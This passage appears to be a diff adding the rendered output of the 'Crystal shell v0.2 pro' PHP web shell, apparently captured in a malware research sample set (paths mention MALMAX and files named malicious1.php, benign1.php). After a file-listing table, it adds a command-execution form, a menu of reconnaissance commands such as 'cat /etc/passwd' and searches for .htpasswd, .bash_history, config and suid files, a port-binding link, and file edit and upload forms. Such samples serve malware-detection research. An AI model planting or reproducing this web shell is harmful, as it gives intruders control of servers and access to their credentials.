onclick=tag('42.php')>42.php</a></td><td>file</td><td>135707</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('43.php')>43.php</a></td><td>file</td><td>19531</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('44.php')>44.php</a></td><td>file</td><td>56075</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('45.php')>45.php</a></td><td>file</td><td>9607</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('46.php')>46.php</a></td><td>file</td><td>17123</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('47.php')>47.php</a></td><td>file</td><td>2691</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('48.php')>48.php</a></td><td>file</td><td>64251</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('49.php')>49.php</a></td><td>file</td><td>1195</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('5.php')>5.php</a></td><td>file</td><td>305507</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('50.php')>50.php</a></td><td>file</td><td>727</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('51.php')>51.php</a></td><td>file</td><td>475</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('52.php')>52.php</a></td><td>file</td><td>21271</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('53.php')>53.php</a></td><td>file</td><td>3399</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('6.php')>6.php</a></td><td>file</td><td>11731</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('7.php')>7.php</a></td><td>file</td><td>55515</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('8.php')>8.php</a></td><td>file</td><td>54751</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('9.php')>9.php</a></td><td>file</td><td>25411</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('benign1.php')>benign1.php</a></td><td>file</td><td>339</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('benign2.php')>benign2.php</a></td><td>file</td><td>1035</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('benign3.php')>benign3.php</a></td><td>file</td><td>271</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('benign4.php')>benign4.php</a></td><td>file</td><td>1835</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('benign5.php')>benign5.php</a></td><td>file</td><td>183</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('malicious1.php')>malicious1.php</a></td><td>file</td><td>103</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('malicious2.php')>malicious2.php</a></td><td>file</td><td>375</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('malicious3.php')>malicious3.php</a></td><td>file</td><td>227</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('malicious4.php')>malicious4.php</a></td><td>file</td><td>1747</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('malicious5.php')>malicious5.php</a></td><td>file</td><td>283</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('stdlib.cookie')>stdlib.cookie</a></td><td>file</td><td>300</td><td>23:49 16 Feb 2020</td><td>23:49 16 Feb 2020</td><td>-rw-rw-r--<td>Yes</td><td>Yes</td></td></tr></table><br>
+<form action="" method="POST">
+Command:<INPUT type="text" name="cmd" size=30 value="">
+
+
+Directory:<INPUT type="text" name="dir" size=30 value="/home/cj/MALMAX/malmax-shipped/malmax-shipped/samples/obfuscated/1">
+<INPUT type="submit" value="..Exec.."></form> </td></tr></table></p></td></tr></table></a><br><hr size="1" noshade><b></form></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
+<tr><td width="100%" height="1" valign="top" colspan="2" bgcolor="#000000"><p align="center">
+	<b>
+	:: </b>
+	<font face=Verdana size=-2><a href="?act=command">Executed command</a></font><b> ::</b></p></td></tr><tr><td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000; border: 1px solid #000000"><center><b>
+	<?
+	echo "
+<form action=\"$REQUEST_URI\" method=\"POST\">
+Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">";
+?>
+		<input type="submit" name="submit1" value="Command" style="border: 1px solid #000000"><font face="Wingdings 3" color="#DCE7EF" size="3">f</font></form><p>
+	&nbsp;</p>
+	</td>
+	<td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000"><center>
+	<form action="?act=cmd" method="POST"><input type="hidden" name="act" value="cmd"><input type="hidden" name="d" value="c:/appserv/www/shells/">
+		<font color="#DCE7EF">Select</font><font face="Wingdings 3" color="#DCE7EF" size="3">g</font><select name="cmd" size="1"><option value="ls -la">
+		-----------------------------------------------------------</option>
+		<option value="ls -la /var/lib/mysq">ls MySQL</option>
+		<option value="which curl">cURL ?</option>
+		<option value="which wget">Wget ?</option>
+		<option value="which lynx">Lynx ?</option>
+		<option value="which links">links ?</option>
+		<option value="which fetch">fetch ?</option>
+		<option value="which GET">GET ?</option>
+		<option value="which per">Perl ?</option>
+		<option value="gcc --help">C gcc Help ?</option>
+		<option value="tar --help">tar Help ?</option>
+		<option value="cat /etc/passwd">Get passwd !!!</option>
+		<option value="cat /etc/hosts">Get hosts</option>
+		<option value="perl --help">Perl Help ?</option>
+		<option value="find / -type f -perm -04000 -ls">
+		find all suid files</option><option value="find . -type f -perm -04000 -ls">
+		find suid files in current dir</option><option value="find / -type f -perm -02000 -ls">
+		find all sgid files</option><option value="find . -type f -perm -02000 -ls">
+		find sgid files in current dir</option><option value="find / -type f -name config.inc.php">
+		find config.inc.php files</option><option value="find / -type f -name &quot;config*&quot;">
+		find config* files</option><option value="find . -type f -name &quot;config*&quot;">
+		find config* files in current dir</option><option value="find / -perm -2 -ls">
+		find all writable directories and files</option><option value="find . -perm -2 -ls">
+		find all writable directories and files in current dir</option><option value="find / -type f -name service.pwd">
+		find all service.pwd files</option><option value="find . -type f -name service.pwd">
+		find service.pwd files in current dir</option><option value="find / -type f -name .htpasswd">
+		find all .htpasswd files</option><option value="find . -type f -name .htpasswd">
+		find .htpasswd files in current dir</option><option value="find / -type f -name .bash_history">
+		find all .bash_history files</option><option value="find . -type f -name .bash_history">
+		find .bash_history files in current dir</option><option value="find / -type f -name .fetchmailrc">
+		find all .fetchmailrc files</option><option value="find . -type f -name .fetchmailrc">
+		find .fetchmailrc files in current dir</option><option value="lsattr -va">
+		list file attributes on a Linux second extended file system</option><option value="netstat -an | grep -i listen">
+		show opened ports</option></select><input type="hidden" name="cmd_txt" value="1">&nbsp;<input type="submit" name="submit" value="Execute" style="border: 1px solid #000000"></form></td></tr></TABLE><a bookmark="minipanel" href="?act=bind"><font face="Verdana" size="-2">Bind port to</font><font face="Webdings" size="5" color="#DCE7EF">آ</font></a><font color="#00FF00"><br>
+</font>
+<a bookmark="minipanel">
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
+<tr>
+ <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><form method="POST">
+	<p align="center">
+<a bookmark="minipanel">
+	<b><font face="verdana" color="red" size="4">
+	<a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel">
+	<font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><a href="?act=edit" bookmark="minipanel"><span lang="en-us"><font face="Verdana" size="2">Edit/Create
+	file</font></span></a><b><font face="verdana" color="red" size="4"><a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel"><font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><font face="Wingdings 2" size="2">&quot;</font></p><p align="center">
+	&nbsp;<?
+if ($act == "edit") {echo "<center><b>التحرير والانشاء:<br><br> قم بوضع اسم الملف الذي تريد تحريره فقط<br>وبعد ذالك الضغط على config.php مثال<br>Edit<br>ستظهر لك نافذه بها محتويات الملف <br>وايضا ً اذا اردت انشاء ملف فقط ضع اسمه مع الامتداد <br>وبعد ذالك اكتب ماتريد washer-crystal.txt   </a>.</b>";}
+?>
+	</p>
+	<p>&nbsp;</p>
+	<p>	<?
+	echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
+File to edit:
+<input type=\"text\" name=\"editfile\" >
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
+<INPUT type=\"submit\" value=\"Edit\"></form></div>";
+?>
+	</p>
+	</form></center></p></td>
+ <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
+                 <?
+if ($act == "upload") {echo "<center><b>رفع الملفات:<br><br>قم بتحديد الملف المراد رفعه <br>وبعد ذالك قم بالضغط على الخيار الموضح<br>UPLOAD< </a>.</b>";}
+?><a bookmark="minipanel"><b><font size="2">::
+	</font>
+	</b><a href="?act=upload"><span lang="en-us"><font face="Verdana" size="2">
+					upload</font></span></a><b><font size="2">::</font></b><font face=Webdings size=2>&#325;</font><font size="2"></a></a></font><br><form method="POST" ENCTYPE="multipart/form-data"><input type="hidden" name="miniform" value="1"><input type="hidden" name="act" value="upload">&nbsp;
+		<?
+		echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<INPUT type=\"file\" name=\"userfile\">
+<INPUT type=\"hidden\" name=\"post\" value=\"yes\">
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
+<INPUT type=\"submit\" value=\"Download\"></form></div>";
+?>
+	<p></form></p></td>
+
+</tr>
+</table>	</a><p><br></p><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+	<td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
+	<b>
+	&nbsp;</b><font face="Wingdings 3" size="5">y</font><b>Crystal shell v. <span lang="en-us">0.2</span> <span lang="en-us">pro</span>&nbsp; </b><font color="#CC0000"><b>©oded by</b> </font><b><span lang="en-us"><a href="http://www.arab4services.com/home">Arab4Services.Com</a></span> |<span lang="en-us">Super-Crystal</span> </b><font face="Wingdings 3" size="5">x</font></p><p align="center">&nbsp;</p></td></tr></table>
+
+</a>
+
+
+<div align="right">
+
+<span lang="en-us">&nbsp;</span></div></body></html>
